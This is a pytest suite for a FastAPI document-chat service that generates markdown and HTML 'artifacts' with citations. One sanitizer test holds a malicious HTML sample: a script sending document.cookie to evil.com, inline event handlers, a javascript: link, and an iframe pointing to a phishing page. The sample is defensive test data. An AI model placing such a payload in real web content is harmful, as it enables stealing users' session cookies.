import uuid
import pytest
from sqlalchemy.orm import Session
from fastapi.testclient import TestClient

from app.main import app
from app.models.document import Document, DocumentChunk
from app.models.chat import MessageRole
from app.models.artifact import Artifact
from app.repositories.artifact import ArtifactRepository
from app.repositories.chat import ChatRepository
from app.services.agent.service import AgentService
from app.services.agent.adapters import MockModelAdapter, ModelProviderError
from app.services.agent.artifacts import (
    ArtifactGenerator,
    detect_artifact_intent,
    sanitize_html_artifact,
    extract_artifact_title,
    ArtifactGenerationInput,
)

@pytest.mark.anyio
async def test_detect_artifact_intent():
    # Markdown intents
    is_art, art_type, _ = detect_artifact_intent("Create a product growth strategy report")
    assert is_art is True
    assert art_type == "markdown"

    is_art, art_type, _ = detect_artifact_intent("Turn this answer into a Markdown document")
    assert is_art is True
    assert art_type == "markdown"

    # HTML intents
    is_art, art_type, _ = detect_artifact_intent("Build a landing page for this product")
    assert is_art is True
    assert art_type == "html"

    is_art, art_type, _ = detect_artifact_intent("Create a dashboard mockup using HTML and CSS")
    assert is_art is True
    assert art_type == "html"

    # Slash commands
    is_art, art_type, p = detect_artifact_intent("/artifact:html SaaS analytics prototype")
    assert is_art is True
    assert art_type == "html"
    assert "SaaS analytics" in p

    is_art, art_type, p = detect_artifact_intent("/artifact:md Quarterly growth breakdown")
    assert is_art is True
    assert art_type == "markdown"

    # Standard chat shouldn't trigger artifact
    is_art, _, _ = detect_artifact_intent("What is Lenny's advice on customer retention?")
    assert is_art is False

@pytest.mark.anyio
async def test_markdown_artifact_generation_grounded(db: Session):
    doc = Document(filename="growth_loops.pdf", content_hash="hash_loops_art", status="indexed")
    db.add(doc)
    db.commit()

    chunk = DocumentChunk(
        document_id=doc.id,
        chunk_index=0,
        page_number=12,
        content="Product-led growth loops compound retention and viral acquisition.",
        embedding=[0.05] * 384,
    )
    db.add(chunk)
    db.commit()

    mock_text = """# Product Growth Strategy Report

## Executive Summary
Product-led growth loops compound retention and viral acquisition [growth_loops.pdf, Page 12].

## Core Growth Loops
1. Viral loops drive user referrals.
2. Content loops build compounding SEO.
"""
    mock_adapter = MockModelAdapter(response_text=mock_text)
    agent = AgentService(db=db, model_adapter=mock_adapter)

    session_id, assistant_msg, citations = await agent.process_chat(
        content="Create a product growth strategy report for viral growth",
        document_ids=[doc.id],
    )

    # 1. Unpacking backward compatibility
    assert session_id is not None
    assert "growth_loops.pdf" in assistant_msg.content or "Product Growth Strategy Report" in assistant_msg.content
    assert len(citations) >= 1
    assert citations[0].title == "growth_loops.pdf"
    assert citations[0].page_number == 12

    # 2. Database persistence verification
    artifact_repo = ArtifactRepository(db)
    artifacts = artifact_repo.list_session_artifacts(session_id)
    assert len(artifacts) == 1
    artifact = artifacts[0]
    assert artifact.title == "Product Growth Strategy Report"
    assert artifact.artifact_type == "markdown"
    assert "Product-led growth loops" in artifact.content
    assert artifact.citations is not None
    assert artifact.citations[0]["page_number"] == 12

@pytest.mark.anyio
async def test_html_artifact_generation(db: Session):
    mock_html = """<!DOCTYPE html>
<html>
<head>
<style>
body { font-family: sans-serif; background: #f8fafc; }
.card { border-radius: 8px; padding: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
</style>
<title>SaaS Dashboard Mockup</title>
</head>
<body>
<div class="card">
<h1>SaaS Growth Dashboard</h1>
<p>Monthly Active Users: 120,000</p>
</div>
</body>
</html>"""
    mock_adapter = MockModelAdapter(response_text=mock_html)
    agent = AgentService(db=db, model_adapter=mock_adapter)

    result = await agent.process_chat(
        content="Create a dashboard mockup using HTML and CSS for SaaS growth",
    )

    assert result.artifact is not None
    assert result.artifact.artifact_type == "html"
    assert "SaaS Growth Dashboard" in result.artifact.content or "SaaS Dashboard Mockup" in result.artifact.title
    assert "<!DOCTYPE html>" in result.artifact.content
    assert "<style>" in result.artifact.content

@pytest.mark.anyio
async def test_html_preview_security_and_sanitization():
    malicious_html = """<!DOCTYPE html>
<html>
<head>
<script>alert('xss'); window.location='http://evil.com?c=' + document.cookie;</script>
<style>body { color: red; }</style>
</head>
<body>
<h1 onclick="stealTokens()">Click Me</h1>
<img src="https://example.com/logo.png" onerror="alert('error')" />
<a href="javascript:void(0)" onmouseover="harmful()">Link</a>
<iframe src="https://evil.com/phishing"></iframe>
<object data="malicious.swf"></object>
<embed src="malicious.pdf">
</body>
</html>"""

    sanitized = sanitize_html_artifact(malicious_html)

    # 1. Scripts completely removed
    assert "<script" not in sanitized.lower()
    assert "alert('xss')" not in sanitized

    # 2. Inline event handlers removed
    assert "onclick" not in sanitized.lower()
    assert "onerror" not in sanitized.lower()
    assert "onmouseover" not in sanitized.lower()

    # 3. javascript: links neutralized
    assert "javascript:" not in sanitized.lower()

    # 4. Dangerous embedding elements removed
    assert "<iframe" not in sanitized.lower()
    assert "<object" not in sanitized.lower()
    assert "<embed" not in sanitized.lower()

    # 5. Safe styling preserved
    assert "<style>body { color: red; }</style>" in sanitized

@pytest.mark.anyio
async def test_session_scoped_artifact_isolation(db: Session):
    chat_repo = ChatRepository(db)
    artifact_repo = ArtifactRepository(db)

    # Create Session A and Artifact A
    session_a = chat_repo.create_session("Session A")
    art_a = artifact_repo.create_artifact(
        session_id=session_a.id,
        title="Artifact A",
        artifact_type="markdown",
        content="# Content A",
    )

    # Create Session B and Artifact B
    session_b = chat_repo.create_session("Session B")
    art_b = artifact_repo.create_artifact(
        session_id=session_b.id,
        title="Artifact B",
        artifact_type="html",
        content="<div>Content B</div>",
    )

    # Verify session A only sees Artifact A
    artifacts_a = artifact_repo.list_session_artifacts(session_a.id)
    assert len(artifacts_a) == 1
    assert artifacts_a[0].id == art_a.id
    assert artifacts_a[0].title == "Artifact A"

    # Verify session B only sees Artifact B
    artifacts_b = artifact_repo.list_session_artifacts(session_b.id)
    assert len(artifacts_b) == 1
    assert artifacts_b[0].id == art_b.id
    assert artifacts_b[0].title == "Artifact B"

@pytest.mark.anyio
async def test_insufficient_evidence_artifact(db: Session):
    doc = Document(filename="unrelated.pdf", content_hash="hash_unrel", status="indexed")
    db.add(doc)
    db.commit()

    mock_adapter = MockModelAdapter(response_text="Should not generate")
    agent = AgentService(db=db, model_adapter=mock_adapter)

    # Asking for artifact with empty/unrelated document
    result = await agent.process_chat(
        content="Create a product growth strategy report for crypto trading",
        document_ids=[doc.id],
    )

    # Should not produce artifact or fabricate citations
    assert result.artifact is None
    assert len(result.citations) == 0
    assert "no relevant content or evidence" in result.assistant_msg.content.lower() or "insufficient" in result.assistant_msg.content.lower()

from app.db.session import get_db

@pytest.fixture
def client(db: Session):
    def override_get_db():
        try:
            yield db
        finally:
            pass

    app.dependency_overrides[get_db] = override_get_db
    yield TestClient(app)
    app.dependency_overrides.clear()

def test_artifact_api_endpoints_and_error_handling(client: TestClient, db: Session):
    chat_repo = ChatRepository(db)
    artifact_repo = ArtifactRepository(db)

    session = chat_repo.create_session("Test API Session")
    artifact = artifact_repo.create_artifact(
        session_id=session.id,
        title="Test API Artifact",
        artifact_type="markdown",
        content="# API Spec",
        citations=[{"source_key": "k", "title": "doc.pdf", "page_number": 1}],
    )

    # 1. GET /api/v1/chat/sessions/{session_id}/artifacts
    res = client.get(f"/api/v1/chat/sessions/{session.id}/artifacts")
    assert res.status_code == 200
    data = res.json()
    assert len(data) == 1
    assert data[0]["id"] == str(artifact.id)
    assert data[0]["title"] == "Test API Artifact"
    assert data[0]["artifact_type"] == "markdown"
    assert data[0]["citations"][0]["page_number"] == 1

    # 2. GET /api/v1/chat/artifacts/{artifact_id}
    res_single = client.get(f"/api/v1/chat/artifacts/{artifact.id}")
    assert res_single.status_code == 200
    single_data = res_single.json()
    assert single_data["title"] == "Test API Artifact"
    assert single_data["content"] == "# API Spec"

    # 3. GET invalid artifact ID -> 404
    non_existent = uuid.uuid4()
    res_404 = client.get(f"/api/v1/chat/artifacts/{non_existent}")
    assert res_404.status_code == 404
    assert "not found" in res_404.json()["detail"].lower()

    # 4. GET invalid session ID -> 404
    res_sess_404 = client.get(f"/api/v1/chat/sessions/{non_existent}/artifacts")
    assert res_sess_404.status_code == 404
    assert "not found" in res_sess_404.json()["detail"].lower()

